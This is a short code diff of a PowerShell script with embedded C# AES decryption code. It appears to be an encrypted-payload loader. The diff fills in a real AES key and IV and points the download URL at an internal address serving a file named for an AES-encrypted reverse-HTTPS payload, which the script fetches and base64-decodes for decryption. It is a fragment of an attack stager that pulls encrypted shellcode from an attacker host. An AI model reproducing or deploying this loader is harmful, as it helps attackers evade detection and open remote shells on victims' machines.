@@ -4,11 +4,12 @@ using System;
 using System.IO;
 using System.Net;
 using System.Security.Cryptography;
+using System.Text;
 
 public static class CryptoHelper
 {
-    private const string Key = "your_key"; // AES key, must be 256 bits long (32 bytes)
-    private const string Vector = "your_vector"; // Initialization vector (IV), must be 128 bits long (16 bytes)
+    private const string Key = "ff827540075736f397c113a5edcb5d93"; // AES key, must be 256 bits long (32 bytes)
+    private const string Vector = "9c3c504fcb064a41"; // Initialization vector (IV), must be 128 bits long (16 bytes)
 
     public static byte[] DecryptBytes(byte[] cipherText)
     {
@@ -30,7 +31,7 @@ public static class CryptoHelper
 "@ -ErrorAction Stop
 
 # Define URL of the web-hosted .txt file containing base64 encrypted string
-$url = "https://example.com/encrypted_bytes.txt"
+$url = "http://192.168.1.172/files/attck-rev-https-aes.txt"
 
 # Download the file and decode it into a byte array
 $byteString = [System.Net.WebClient]::new().DownloadData($url) | ForEach-Object { [Convert]::FromBase64String($_) }
